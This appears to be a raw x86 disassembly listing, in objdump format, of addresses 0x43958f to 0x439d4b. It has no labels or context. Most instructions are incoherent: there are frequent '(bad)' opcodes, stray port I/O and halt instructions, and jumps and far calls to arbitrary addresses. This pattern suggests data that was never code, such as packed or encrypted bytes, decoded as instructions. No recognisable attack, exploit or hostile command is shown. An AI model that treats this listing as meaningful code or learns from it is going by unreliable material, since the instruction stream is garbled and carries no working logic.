  43958f:	cs or  esp,esi
  439592:	nop
  439593:	mov    al,0xa2
  439595:	push   ebp
  439596:	mov    gs,WORD PTR [edi-0x24]
  439599:	outs   dx,BYTE PTR ds:[esi]
  43959a:	mov    eax,0x78d77677
  43959f:	inc    eax
  4395a0:	mov    esp,0xcf876aa
  4395a5:	push   0x2b
  4395a7:	repnz sub dx,WORD PTR [ebx]
  4395ab:	(bad)  
  4395ac:	lods   al,BYTE PTR ds:[esi]
  4395ad:	jmp    0x43959f
  4395af:	jecxz  0x439613
  4395b1:	retf   0x320f
  4395b4:	mov    dh,0xa6
  4395b6:	lock sub BYTE PTR [ebx-0x3b543518],bl
  4395bd:	mov    dl,0xda
  4395bf:	dec    esp
  4395c0:	push   0x3a5c646a
  4395c5:	ds ret 0xcee
  4395c9:	in     al,dx
  4395ca:	push   ecx
  4395cb:	ins    DWORD PTR es:[edi],dx
  4395cc:	mov    eax,ds:0xd3823416
  4395d1:	loopne 0x43959d
  4395d3:	jae    0x439619
  4395d5:	and    ecx,DWORD PTR [edi+eiz*1+0x1c8ae830]
  4395dc:	xchg   edi,eax
  4395dd:	push   ecx
  4395de:	icebp  
  4395df:	mov    al,BYTE PTR [esi+ebp*8-0x2]
  4395e3:	cmp    dh,BYTE PTR [ecx-0x294b891e]
  4395e9:	fcmovb st,st(1)
  4395eb:	push   ss
  4395ec:	mov    ss,WORD PTR [edx-0x4f]
  4395ef:	xor    al,0xb1
  4395f1:	sbb    al,0xfb
  4395f3:	push   es
  4395f4:	enter  0x447a,0x17
  4395f8:	test   eax,0x39126e35
  4395fd:	and    BYTE PTR ds:0xd14050a1,bh
  439603:	es fcmovnu st,st(1)
  439606:	mov    eax,0xc7485430
  43960b:	scas   al,BYTE PTR es:[edi]
  43960c:	push   eax
  43960d:	mov    dh,0xda
  43960f:	sub    ebp,DWORD PTR [ecx+0x56de52d0]
  439615:	jne    0x4395bd
  439617:	cdq    
  439618:	dec    eax
  439619:	popa   
  43961a:	scas   eax,DWORD PTR es:[edi]
  43961b:	pop    ss
  43961c:	js     0x439605
  43961e:	fwait
  43961f:	add    eax,DWORD PTR [ebp-0x1]
  439622:	inc    eax
  439623:	sub    eax,0xbebaf089
  439628:	ins    BYTE PTR es:[edi],dx
  439629:	sub    BYTE PTR [edx+esi*1-0x7d23bfab],bh
  439630:	add    BYTE PTR [eax+0x3f091d65],al
  439636:	sub    eax,0x66284f2a
  43963b:	pop    esi
  43963c:	test   al,0xa3
  43963e:	retf   
  43963f:	or     al,0xc6
  439641:	je     0x43965e
  439643:	ss hlt 
  439645:	sub    edi,DWORD PTR [eax-0x54314bf0]
  43964b:	fadd   QWORD PTR [eax+0x5209ba82]
  439651:	ret    0x694b
  439654:	inc    edi
  439655:	in     al,0x96
  439657:	mov    edx,0xd2e7025d
  43965c:	lahf   
  43965d:	push   es
  43965e:	lock dec ebx
  439660:	jle    0x4396d2
  439662:	aas    
  439663:	cmp    dl,bh
  439665:	push   edx
  439666:	fwait
  439667:	lods   eax,DWORD PTR ds:[esi]
  439668:	push   0x10
  43966a:	bound  edx,QWORD PTR [edx]
  43966c:	adc    edi,DWORD PTR [ecx-0x7e]
  43966f:	rcr    BYTE PTR [esi+0x17],1
  439672:	add    DWORD PTR [ecx-0x1d2b1d5e],esp
  439678:	adc    BYTE PTR [edi],dl
  43967a:	jo     0x4396ca
  43967c:	gs loopne 0x439612
  43967f:	aad    0x6e
  439681:	pushf  
  439682:	stos   BYTE PTR es:[edi],al
  439683:	mov    edi,0xf5221266
  439688:	cli    
  439689:	pop    esp
  43968a:	imul   ebx,DWORD PTR ss:[ebx],0x35eb6245
  439691:	mov    al,ds:0x9c57102e
  439696:	into   
  439697:	ror    ecx,cl
  439699:	lods   al,BYTE PTR ds:[esi]
  43969a:	jbe    0x43969c
  43969c:	push   esi
  43969d:	cs cs clc 
  4396a0:	stos   BYTE PTR es:[edi],al
  4396a1:	mov    ch,0xa0
  4396a3:	ror    DWORD PTR [esi+ebp*4],0x56
  4396a7:	and    DWORD PTR [eax+0x613f88a5],edx
  4396ad:	ins    DWORD PTR es:[edi],dx
  4396ae:	(bad)  
  4396af:	sub    al,0x84
  4396b1:	mov    esi,0xea0ed0dc
  4396b6:	mov    dl,0x82
  4396b8:	lods   eax,DWORD PTR ds:[esi]
  4396b9:	push   ebp
  4396ba:	cmp    al,0x9
  4396bc:	aam    0x38
  4396be:	mov    esi,0x4c3b7619
  4396c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4396c4:	jo     0x439727
  4396c6:	stos   BYTE PTR es:[edi],al
  4396c7:	add    DWORD PTR [edx-0x75],esi
  4396ca:	xchg   esp,eax
  4396cb:	jl     0xd51703d7
  4396d1:	or     ebx,eax
  4396d3:	and    esp,DWORD PTR [esp+edi*4-0x45]
  4396d7:	inc    ecx
  4396d8:	pop    ss
  4396d9:	aad    0x0
  4396db:	sbb    DWORD PTR [eax],edx
  4396dd:	jmp    0xe341:0x78da6a66
  4396e4:	shl    DWORD PTR [edi-0x50],cl
  4396e7:	add    dh,BYTE PTR [ebx-0x80]
  4396ea:	inc    ebp
  4396eb:	dec    esi
  4396ec:	pop    ebp
  4396ed:	into   
  4396ee:	inc    BYTE PTR [edx+esi*1]
  4396f1:	adc    al,0xc3
  4396f3:	cmp    al,0x5
  4396f5:	xor    eax,0x382add84
  4396fa:	dec    edi
  4396fb:	es stos BYTE PTR es:[edi],al
  4396fd:	jle    0x43976b
  4396ff:	sub    DWORD PTR [ebp+0x2f389b00],edx
  439705:	push   ebp
  439706:	add    cl,BYTE PTR [eax]
  439708:	mov    ds:0x364ac88f,al
  43970d:	inc    esi
  43970e:	push   esi
  43970f:	push   ebp
  439710:	inc    edi
  439711:	imul   ebx,DWORD PTR [esi+0x7b],0xffffffb2
  439715:	xlat   BYTE PTR ds:[ebx]
  439716:	in     al,0xde
  439718:	rcl    ah,0x74
  43971b:	mov    ah,0x46
  43971d:	test   DWORD PTR [edx+0x4c8d8d42],ebp
  439723:	call   0x16d7f7ac
  439728:	sbb    BYTE PTR [esi],dl
  43972a:	push   ds
  43972b:	cmp    al,0x37
  43972d:	pop    esp
  43972e:	sbb    ch,al
  439730:	repz inc ecx
  439732:	pop    ss
  439733:	add    BYTE PTR [eax+ebp*8+0x70304640],al
  43973a:	or     eax,0x26c4fa55
  43973f:	aad    0x61
  439741:	push   edi
  439742:	shl    eax,cl
  439744:	sub    dh,BYTE PTR [edx]
  439746:	int3   
  439747:	mov    bh,0xa4
  439749:	leave  
  43974a:	xor    DWORD PTR [esi],eax
  43974c:	xor    eax,0x40af1a24
  439752:	xchg   edx,eax
  439753:	add    ch,ch
  439755:	pop    edx
  439756:	ret    0xe9d
  439759:	aam    0xef
  43975b:	xchg   esp,eax
  43975c:	pop    esp
  43975d:	xor    eax,0xd2021da8
  439762:	nop
  439763:	(bad)  
  439765:	jo     0x439769
  439767:	je     0x43978a
  439769:	jmp    0x439796
  43976b:	adc    bl,BYTE PTR [esi+esi*4+0xf]
  43976f:	inc    edx
  439770:	stos   DWORD PTR es:[edi],eax
  439771:	outs   dx,BYTE PTR ds:[esi]
  439772:	push   esp
  439773:	cs add dl,dh
  439776:	xor    BYTE PTR [esi-0x52e7c3ea],bl
  43977c:	mov    ds:0x622a3b82,al
  439781:	and    BYTE PTR [edi+0x496e5828],cl
  439787:	pushaw 
  439789:	mov    edx,0x122a0a14
  43978e:	sub    BYTE PTR [esi+edx*8],0x80
  439792:	mov    ss,WORD PTR [ebx+0x4823a6d2]
  439798:	jp     0x4397f8
  43979a:	jb     0x439763
  43979c:	rcl    BYTE PTR [ebx+0x672aeda4],0x76
  4397a3:	aaa    
  4397a4:	fst    QWORD PTR [eax]
  4397a6:	jmp    0x13e50123
  4397ab:	les    esp,FWORD PTR [ecx+0x4c]
  4397ae:	fs pop ds
  4397b0:	dec    esi
  4397b1:	add    BYTE PTR ds:0x6c1bc6cf,bl
  4397b7:	sbb    dh,BYTE PTR [eax+0xb]
  4397ba:	add    ax,WORD PTR [edx+0x5b3e725b]
  4397c1:	xchg   edx,eax
  4397c2:	pop    ebx
  4397c3:	rcr    BYTE PTR cs:[eax],1
  4397c6:	pop    es
  4397c7:	push   0xb8ae9345
  4397cc:	mov    ds:0x42d5c528,eax
  4397d1:	push   0xffffff87
  4397d3:	add    BYTE PTR [esi-0x398cb93a],dh
  4397d9:	retf   0xe86c
  4397dc:	mov    eax,0x2c6caeb0
  4397e1:	mov    WORD PTR [edx],cs
  4397e3:	inc    eax
  4397e4:	ins    BYTE PTR es:[edi],dx
  4397e5:	(bad)  
  4397e6:	fcmovu st,st(4)
  4397e8:	xchg   edx,eax
  4397e9:	add    al,0x3e
  4397eb:	jmp    0xe8a3:0xc9a07a0
  4397f2:	sbb    BYTE PTR [ecx+edx*4+0x8],bh
  4397f6:	popf   
  4397f7:	shr    DWORD PTR [edx+ebp*4],0x48
  4397fb:	or     al,0xaa
  4397fd:	les    ecx,FWORD PTR [esi+0x2cd6a8a5]
  439803:	test   al,0x6c
  439805:	push   0xffffffad
  439807:	mov    ch,cl
  439809:	lea    esp,[ebx]
  43980b:	loope  0x439819
  43980d:	jns    0x4397c9
  43980f:	or     eax,0x2afd2edc
  439814:	mov    dl,0x6a
  439816:	or     bh,BYTE PTR [eax+0x2d86c4ee]
  43981c:	adc    al,bh
  43981e:	dec    ecx
  43981f:	in     eax,dx
  439820:	mov    ds:0x5577d81d,al
  439826:	lods   eax,DWORD PTR ds:[esi]
  439827:	dec    ebx
  439828:	add    cl,ah
  43982a:	xor    ch,bl
  43982c:	sub    al,0xb6
  43982e:	mov    dl,0x3a
  439830:	sbb    DWORD PTR [ebx],edi
  439832:	ficom  DWORD PTR [edi-0x43672978]
  439838:	pop    esi
  439839:	in     eax,dx
  43983a:	jle    0x4397d6
  43983c:	clc    
  43983d:	fwait
  43983e:	clc    
  43983f:	add    DWORD PTR [ecx],eax
  439841:	inc    edx
  439842:	add    al,0x35
  439844:	lods   eax,DWORD PTR ds:[esi]
  439845:	mov    al,ds:0xce27ec3
  43984a:	and    eax,0x12aeccb8
  43984f:	cmp    BYTE PTR [eax+0x5825317],ah
  439855:	dec    ebp
  439856:	mov    al,ds:0xa973c055
  43985b:	imul   BYTE PTR [ebp-0x51aa5dfd]
  439861:	jnp    0x4398c7
  439863:	dec    ebx
  439864:	inc    edx
  439865:	and    al,0xc0
  439867:	mov    ds:0x7c802537,al
  43986c:	out    0xbd,eax
  43986e:	add    BYTE PTR [edi],bl
  439870:	loopne 0x43986c
  439872:	and    edx,eax
  439874:	sub    eax,0xa6c41ae2
  439879:	xchg   esi,eax
  43987a:	hlt    
  43987b:	ins    DWORD PTR es:[edi],dx
  43987c:	ins    BYTE PTR es:[edi],dx
  43987d:	push   0xffffffd6
  43987f:	fcom   QWORD PTR [esi+0x39]
  439882:	and    al,dl
  439884:	nop
  439885:	sub    dl,al
  439887:	ror    BYTE PTR [esi-0x5b31eb3e],1
  43988d:	xor    DWORD PTR [ecx],ecx
  43988f:	dec    ebp
  439890:	imul   edi,eax,0xffffffe4
  439893:	push   0xb8827b32
  439898:	scas   al,BYTE PTR es:[edi]
  439899:	add    BYTE PTR [eax+0x55],al
  43989c:	or     esi,0x3ea8230
  4398a2:	outs   dx,DWORD PTR ds:[esi]
  4398a3:	push   ecx
  4398a4:	or     eax,0x44fcc096
  4398a9:	outs   dx,BYTE PTR ds:[esi]
  4398aa:	add    eax,0xead6c8f0
  4398af:	xchg   ebx,eax
  4398b0:	mov    esi,0x5ba8e14c
  4398b5:	add    DWORD PTR [ecx-0x3c],0x73
  4398b9:	sbb    cl,al
  4398bb:	ins    DWORD PTR es:[edi],dx
  4398bc:	mov    BYTE PTR [esi],al
  4398be:	push   ds
  4398bf:	mov    ds:0xde436bb5,al
  4398c4:	loop   0x4398a8
  4398c6:	out    0xc4,al
  4398c8:	mov    cl,0x7c
  4398ca:	xor    BYTE PTR [eax+0x5eb9caa9],0xca
  4398d1:	mov    edi,0x65266448
  4398d6:	xor    dh,BYTE PTR [esp+eiz*2+0x22]
  4398da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4398db:	pusha  
  4398dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4398dd:	xchg   edi,eax
  4398de:	nop
  4398df:	sub    bh,BYTE PTR [edx-0x18]
  4398e2:	pop    edx
  4398e3:	push   0x23a07c0a
  4398e8:	mov    DWORD PTR [ebp-0x80],eax
  4398eb:	rcr    al,0x38
  4398ee:	mov    ebx,DWORD PTR [eax+edx*1+0x2a]
  4398f2:	or     dl,dl
  4398f4:	inc    eax
  4398f5:	ds out dx,eax
  4398f7:	mov    edx,edx
  4398f9:	stos   BYTE PTR es:[edi],al
  4398fa:	pop    es
  4398fb:	sbb    DWORD PTR [eax+ecx*8-0x40],ecx
  4398ff:	pop    edi
  439900:	xor    DWORD PTR ds:0x90d9ed81,esp
  439906:	je     0x4398b4
  439908:	mov    dh,BYTE PTR [esp+eiz*8]
  43990b:	adc    ah,BYTE PTR [ecx+0x5b]
  43990e:	ret    
  43990f:	or     dl,BYTE PTR [eax+0x6a]
  439912:	fs lahf 
  439914:	fmul   QWORD PTR [esi-0x5ba4f540]
  43991a:	js     0x43997e
  43991c:	das    
  43991d:	xchg   edi,eax
  43991e:	jbe    0x439914
  439920:	sbb    eax,edx
  439922:	test   BYTE PTR ds:0x89f44bf6,cl
  439928:	in     al,dx
  439929:	sub    dh,bh
  43992b:	pop    DWORD PTR [edi]
  43992d:	ror    BYTE PTR [edi-0x17],0xb3
  439931:	inc    edx
  439932:	imul   ebp,DWORD PTR [esi-0x78ce3e4],0x9a0f6c45
  43993c:	lds    ecx,FWORD PTR [eax-0x4fd949f3]
  439942:	adc    eax,0x9d243b4
  439947:	xchg   esi,eax
  439948:	test   BYTE PTR [eax+0x35],cl
  43994b:	add    al,0x68
  43994d:	mov    ebx,0x942b04b2
  439952:	in     al,0x48
  439954:	and    al,0xd1
  439956:	add    bh,BYTE PTR [ebx+0x4]
  439959:	sbb    dh,bl
  43995b:	dec    esp
  43995c:	push   es
  43995d:	data16 mov dl,0xb0
  439960:	xor    al,0x90
  439962:	ss mov eax,0x2bd9329e
  439968:	rol    BYTE PTR [esi+0x2b3690f],cl
  43996e:	sbb    ah,BYTE PTR [edx+ecx*4+0x250626b]
  439975:	jp     0x43992b
  439977:	shl    DWORD PTR [esi+0x46],0x24
  43997b:	jl     0x4399ab
  43997d:	sub    BYTE PTR ds:0x66fe5c53,dh
  439983:	ins    DWORD PTR es:[edi],dx
  439984:	add    dh,BYTE PTR [esi]
  439986:	fisubr DWORD PTR [edx]
  439988:	inc    eax
  439989:	mov    edi,0x3fedc222
  43998e:	(bad)  
  43998f:	xor    eax,0xbd40fb56
  439994:	xor    dl,BYTE PTR [ebp-0x33c3a71e]
  43999a:	sbb    al,0xc6
  43999c:	inc    edi
  43999d:	mov    bl,0xe3
  43999f:	or     BYTE PTR [eax+0x68],bl
  4399a2:	(bad)  
  4399a3:	cmp    DWORD PTR [eax-0x4f],edi
  4399a6:	add    BYTE PTR [esi-0x368c9f9d],dh
  4399ac:	add    bl,cl
  4399ae:	push   edx
  4399af:	(bad)  
  4399b0:	outs   dx,BYTE PTR ds:[esi]
  4399b1:	out    0x82,eax
  4399b3:	setae  BYTE PTR [edi-0x4c]
  4399b7:	pop    ss
  4399b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4399b9:	xor    bh,bh
  4399bb:	mov    ah,0xd6
  4399bd:	pop    ebp
  4399be:	in     al,0xed
  4399c0:	and    DWORD PTR [edx-0x6439d97f],ebp
  4399c6:	(bad)  
  4399c7:	jp     0x4399ee
  4399c9:	ror    BYTE PTR ds:0x1863aac6,1
  4399cf:	scas   al,BYTE PTR es:[edi]
  4399d0:	imul   edi,DWORD PTR [eax+0x7d],0x51
  4399d4:	adc    BYTE PTR [edx-0x2a1f6c13],al
  4399da:	mov    dl,0xdc
  4399dc:	xchg   ecx,eax
  4399dd:	test   BYTE PTR [edi],bl
  4399df:	or     al,0xb5
  4399e1:	sub    cl,BYTE PTR [edx]
  4399e3:	stos   DWORD PTR es:[edi],eax
  4399e4:	mov    eax,0xa9b4b2e9
  4399e9:	inc    esp
  4399ea:	shl    DWORD PTR [edi],0x48
  4399ed:	stos   BYTE PTR es:[edi],al
  4399ee:	xor    al,0x32
  4399f0:	sub    al,BYTE PTR [ebx-0x705afa18]
  4399f6:	js     0x439a77
  4399f8:	stos   BYTE PTR es:[edi],al
  4399f9:	cld    
  4399fa:	dec    edi
  4399fb:	push   0x18
  4399fd:	mov    dh,dh
  4399ff:	add    eax,0x7a407ca0
  439a04:	in     al,dx
  439a05:	push   ebp
  439a06:	(bad)  
  439a07:	adc    BYTE PTR [esi],dh
  439a09:	outs   dx,BYTE PTR ds:[esi]
  439a0a:	(bad)  
  439a0b:	fs sahf 
  439a0d:	xor    ah,cl
  439a0f:	mov    eax,ds:0xac6928db
  439a14:	push   ebx
  439a15:	mov    ah,0x2a
  439a17:	mov    ds:0x984d8e02,al
  439a1c:	add    eax,0x78167059
  439a21:	test   al,0xd8
  439a23:	adc    al,0xb8
  439a25:	jbe    0x439a6f
  439a27:	jg     0x439a5a
  439a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439a2a:	mov    ds,WORD PTR [ecx+0x415eb21f]
  439a30:	repnz mov dh,0xa1
  439a33:	sbb    al,0x68
  439a35:	xchg   esp,eax
  439a36:	cmc    
  439a37:	add    al,0x6d
  439a39:	fs and dh,bl
  439a3c:	mov    al,0x5a
  439a3e:	xchg   ebx,eax
  439a3f:	mov    bh,cl
  439a41:	sub    bh,al
  439a43:	push   es
  439a44:	stos   BYTE PTR es:[edi],al
  439a45:	sub    ebp,DWORD PTR [esi-0x30]
  439a48:	fisubr DWORD PTR [edx]
  439a4a:	(bad)  
  439a4c:	mov    esp,es
  439a4e:	loop   0x439a5f
  439a50:	(bad)  
  439a51:	out    dx,al
  439a52:	popa   
  439a53:	sbb    BYTE PTR [ebp+ebx*2-0x5b8c777],ch
  439a5a:	shr    DWORD PTR [eax],cl
  439a5c:	in     al,0x56
  439a5e:	push   ebx
  439a5f:	adc    DWORD PTR [ebp+0x1c],0xffffffd8
  439a63:	or     BYTE PTR [ebp+ebx*1-0x656fa706],0xba
  439a6b:	push   esp
  439a6c:	and    cl,BYTE PTR [esi]
  439a6e:	adc    BYTE PTR [esi],0x60
  439a71:	adc    BYTE PTR [esi+0x50],bh
  439a74:	pop    ebp
  439a75:	shl    BYTE PTR [esi-0x7c6b9cec],0xa1
  439a7c:	push   ebx
  439a7d:	pop    es
  439a7e:	(bad)  
  439a7f:	out    dx,al
  439a80:	inc    eax
  439a81:	scas   eax,DWORD PTR es:[edi]
  439a82:	or     BYTE PTR [ecx+ecx*1],ch
  439a85:	shl    BYTE PTR [ebx],cl
  439a87:	imul   esi,DWORD PTR [edi+0x62],0x9dbb534a
  439a8e:	clc    
  439a8f:	xor    ah,0xf8
  439a92:	fs push ds
  439a94:	call   0xeaa8:0xb05dc20a
  439a9b:	sbb    esi,esi
  439a9d:	xor    eax,0x4486a3aa
  439aa2:	xchg   edx,eax
  439aa3:	push   esp
  439aa4:	enter  0x4f8,0x4c
  439aa8:	and    DWORD PTR [edi*8+0x61aed6d6],0x4c
  439ab0:	jge    0x439a3a
  439ab2:	lock xor BYTE PTR [ebx],0x52
  439ab6:	inc    edx
  439ab7:	or     al,0xe3
  439ab9:	shl    dh,1
  439abb:	xchg   DWORD PTR [esi+0x68],edi
  439abe:	mov    edi,0x7ab40284
  439ac3:	push   esp
  439ac4:	es (bad) 
  439ac6:	mov    eax,0xf540b514
  439acb:	pop    edx
  439acc:	out    0x47,al
  439ace:	add    al,0x24
  439ad0:	adc    ch,BYTE PTR [edi]
  439ad2:	sbb    al,0x4
  439ad4:	adc    eax,0x74a830fd
  439ad9:	jg     0x439b49
  439adb:	loope  0x439add
  439add:	add    eax,0x92ca3e06
  439ae2:	jb     0x439b15
  439ae4:	jmp    0x439af8
  439ae6:	(bad)  
  439ae7:	arpl   WORD PTR [eax+edi*2-0x49f9c1a6],si
  439aee:	scas   al,BYTE PTR es:[edi]
  439aef:	mov    eax,ds:0x8cc1a60e
  439af4:	xchg   BYTE PTR [eax+ebp*1],al
  439af7:	mov    dl,0x21
  439af9:	dec    esp
  439afa:	inc    esp
  439afb:	rcl    al,0x99
  439afe:	popa   
  439aff:	lea    esi,[edx-0x69bf6060]
  439b05:	cmp    edx,DWORD PTR [edx-0x1abf5d4b]
  439b0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439b0c:	xchg   ebp,eax
  439b0d:	jle    0x439b05
  439b0f:	adc    al,0x6a
  439b11:	add    eax,0xce690970
  439b16:	popf   
  439b17:	pop    edx
  439b18:	pop    edi
  439b19:	fmul   st,st(2)
  439b1b:	inc    eax
  439b1c:	test   DWORD PTR ds:0xd450b4f0,ebp
  439b22:	fdivr  st(1),st
  439b24:	lock cmp BYTE PTR [ebp-0x5e],bh
  439b28:	js     0x439b2a
  439b2a:	hlt    
  439b2b:	pop    ebp
  439b2c:	out    0xfd,al
  439b2e:	leave  
  439b2f:	fsub   DWORD PTR [eax+0x58]
  439b32:	mov    edx,0xb06223de
  439b37:	mov    edi,0xcaa1440c
  439b3c:	cmc    
  439b3d:	repnz inc bx
  439b40:	and    BYTE PTR [esi-0x4f4b878a],dl
  439b46:	inc    eax
  439b47:	into   
  439b48:	push   esp
  439b49:	mov    ebx,0x82b3e013
  439b4e:	cli    
  439b4f:	popa   
  439b50:	ins    BYTE PTR es:[edi],dx
  439b51:	(bad)  
  439b52:	lods   al,BYTE PTR ds:[esi]
  439b53:	push   esp
  439b54:	mov    esp,0x750e53c
  439b59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439b5a:	push   ds
  439b5b:	pop    eax
  439b5c:	mov    dh,BYTE PTR [eax+0x76]
  439b5f:	pop    ss
  439b60:	sbb    ebx,DWORD PTR [esi-0x759d7c]
  439b66:	cwde   
  439b67:	and    BYTE PTR [eax+ebp*1+0x128d5275],bh
  439b6e:	sbb    al,0xde
  439b70:	pop    esi
  439b71:	add    eax,0x1ea04f6d
  439b76:	adc    dl,BYTE PTR [eax-0x67]
  439b79:	hlt    
  439b7a:	mov    ecx,0xcd82a922
  439b7f:	sub    dh,BYTE PTR [esi-0x4769c1dd]
  439b85:	cld    
  439b86:	out    dx,eax
  439b87:	cs scas eax,DWORD PTR es:[edi]
  439b89:	fmul   QWORD PTR [ebp+ebp*8+0x23]
  439b8d:	sbb    DWORD PTR [edi],ecx
  439b8f:	cmp    BYTE PTR [ebx+0x50],0x3b
  439b93:	xchg   edi,eax
  439b94:	(bad)  
  439b95:	popa   
  439b96:	jecxz  0x439bf0
  439b98:	ret    0x577
  439b9b:	push   edx
  439b9c:	mov    WORD PTR [edi],fs
  439b9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439b9f:	xchg   edi,eax
  439ba0:	push   eax
  439ba1:	mov    ?,WORD PTR [ecx+0x6]
  439ba4:	enter  0x8415,0x53
  439ba8:	inc    edi
  439ba9:	test   al,0xf6
  439bab:	pop    ecx
  439bac:	pop    eax
  439bad:	add    bh,BYTE PTR [ebp+0x26]
  439bb0:	aam    0x36
  439bb2:	lods   al,BYTE PTR ds:[esi]
  439bb3:	or     BYTE PTR [esi],dh
  439bb5:	out    dx,al
  439bb6:	mov    esi,DWORD PTR [edx]
  439bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439bb9:	out    0x88,al
  439bbb:	js     0x439be9
  439bbd:	stos   DWORD PTR es:[edi],eax
  439bbe:	les    edi,FWORD PTR [edx+ecx*8+0x1505f80b]
  439bc5:	es jmp 0x439ba8
  439bc8:	cld    
  439bc9:	jp     0x439c1d
  439bcb:	div    BYTE PTR es:[ebx-0x77]
  439bcf:	pop    edi
  439bd0:	ss call 0xc6f6:0xae5097e7
  439bd8:	cmovnp ebx,DWORD PTR [edi-0x6b3be508]
  439bdf:	imul   ecx,DWORD PTR [eax+edi*8],0xffffff80
  439be3:	cmc    
  439be4:	mov    dh,BYTE PTR [eax+0x22]
  439be7:	test   al,0x74
  439be9:	dec    ebx
  439bea:	fidivr DWORD PTR [esi-0x7e2d12c0]
  439bf0:	stc    
  439bf1:	mov    al,0x80
  439bf3:	(bad)  
  439bf4:	and    ebx,DWORD PTR [esi-0x3da7224b]
  439bfa:	jl     0x439bf6
  439bfc:	aad    0xaf
  439bfe:	retf   0xe887
  439c01:	jo     0x439c4e
  439c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439c04:	xor    al,0x16
  439c06:	push   esp
  439c07:	push   ds
  439c08:	lods   eax,DWORD PTR ds:[esi]
  439c09:	ret    
  439c0a:	inc    edx
  439c0b:	test   DWORD PTR [eax+0x7469cc1c],edx
  439c11:	inc    esp
  439c12:	imul   edx,DWORD PTR [ecx-0x6d3f3526],0x3e
  439c19:	mov    ch,cl
  439c1b:	imul   esi,DWORD PTR [edx+ebx*8-0x72],0xa3e913e5
  439c23:	mov    edx,0xb1e18bb2
  439c28:	lods   al,BYTE PTR ds:[esi]
  439c29:	xchg   dh,cl
  439c2b:	push   cs
  439c2c:	or     ebx,DWORD PTR [eax+ecx*1]
  439c2f:	out    dx,al
  439c30:	dec    ecx
  439c31:	dec    edi
  439c32:	xchg   edx,eax
  439c33:	push   ds
  439c34:	lock add DWORD PTR [edx],0xffffff94
  439c38:	jnp    0x439c8a
  439c3a:	das    
  439c3b:	dec    ecx
  439c3c:	push   ebp
  439c3d:	mov    al,BYTE PTR [edi-0x2e]
  439c40:	ret    0x1559
  439c43:	mov    ch,0xa0
  439c45:	loop   0x439c9f
  439c47:	mov    ch,0x94
  439c49:	push   ss
  439c4a:	fsubr  DWORD PTR [ecx]
  439c4c:	pop    ebp
  439c4d:	(bad)  
  439c4e:	sbb    DWORD PTR [edx-0x7d],eax
  439c51:	or     BYTE PTR [edx+eiz*2+0x13],0x80
  439c56:	dec    eax
  439c57:	nop
  439c58:	(bad)  
  439c59:	imul   BYTE PTR [eax]
  439c5b:	mov    WORD PTR [ebx-0x56],cs
  439c5e:	mov    dl,dl
  439c60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439c61:	mov    edi,0x805f0524
  439c66:	ss xchg BYTE PTR es:[eax-0x36],dh
  439c6b:	adc    al,0xae
  439c6d:	out    dx,eax
  439c6e:	inc    eax
  439c6f:	sbb    DWORD PTR [edi],ecx
  439c71:	sbb    BYTE PTR [ebp-0x80],0x4e
  439c75:	and    BYTE PTR [edx+0x74f4230a],al
  439c7b:	inc    ebx
  439c7c:	mov    es,WORD PTR [esp+edi*2]
  439c7f:	mov    bh,BYTE PTR [esi+0x9c689f5]
  439c85:	inc    ebp
  439c86:	xor    dl,BYTE PTR [esi-0x54]
  439c89:	xchg   si,ax
  439c8b:	mov    dh,0x7d
  439c8d:	or     ebx,edx
  439c8f:	xor    al,0xb
  439c91:	inc    esi
  439c92:	cmp    dh,BYTE PTR [edx+0x28ed84c4]
  439c98:	jp     0x439ce7
  439c9a:	imul   esi,DWORD PTR [ebx+0x2316d0e7],0x564a2abc
  439ca4:	cmp    eax,DWORD PTR [eax+0x2414103e]
  439caa:	addr16 fs daa 
  439cad:	dec    esp
  439cae:	shl    BYTE PTR [esi+0x28],1
  439cb1:	pusha  
  439cb2:	xchg   ebx,eax
  439cb3:	es test al,0xca
  439cb6:	jl     0x439cd3
  439cb8:	xor    eax,DWORD PTR [edi]
  439cba:	mov    al,0xe0
  439cbc:	rol    BYTE PTR [esi+0x26],cl
  439cbf:	adc    ch,BYTE PTR [ecx+edi*8+0x6fc68b38]
  439cc6:	jmp    0xbce6375a
  439ccb:	xchg   esi,eax
  439ccc:	mov    ebx,0x1ee3b434
  439cd1:	adc    BYTE PTR [edx],0x28
  439cd4:	out    0xd6,al
  439cd6:	les    edx,FWORD PTR [esi]
  439cd8:	popf   
  439cd9:	fcom   QWORD PTR es:[eax-0x42]
  439cdd:	inc    eax
  439cde:	je     0x439d0b
  439ce0:	(bad)  
  439ce1:	sbb    cl,BYTE PTR [eax]
  439ce3:	push   0xffffffca
  439ce5:	mov    ds:0x9d8e0171,eax
  439cea:	mov    eax,0xaaa0a5e1
  439cef:	retf   0x1848
  439cf2:	dec    esi
  439cf3:	lock cs (bad) 
  439cf6:	hlt    
  439cf7:	add    DWORD PTR [ebx-0x24e91dfe],ebx
  439cfd:	sub    dh,al
  439cff:	pushf  
  439d00:	outs   dx,BYTE PTR ds:[esi]
  439d01:	pusha  
  439d02:	fld    QWORD PTR [ebx+0x65]
  439d05:	pop    ebp
  439d06:	dec    ecx
  439d07:	or     al,0x37
  439d09:	jo     0x439d4e
  439d0b:	sub    esi,DWORD PTR [eax-0x7d9447b6]
  439d11:	pusha  
  439d12:	clc    
  439d13:	fdivr  QWORD PTR [edi+0x3e]
  439d16:	or     esp,DWORD PTR [edx-0x3394ada5]
  439d1c:	sub    eax,0x21aa0622
  439d21:	mov    ch,0x53
  439d23:	or     dh,BYTE PTR [eax-0x54e2b4bc]
  439d29:	dec    ebx
  439d2a:	jp     0x439cc6
  439d2c:	xchg   ebp,eax
  439d2d:	xchg   cl,cl
  439d2f:	test   al,0xee
  439d31:	or     eax,0x52a9aab6
  439d36:	mov    eax,0x6cf67b16
  439d3b:	(bad)  
  439d3c:	fs push 0x85e14905
  439d42:	(bad)  
  439d43:	int    0x16
  439d45:	adc    DWORD PTR [ebx-0x37],esp
  439d48:	ss mov dh,0x74
  439d4b:	mov    esp,0x85ad1729
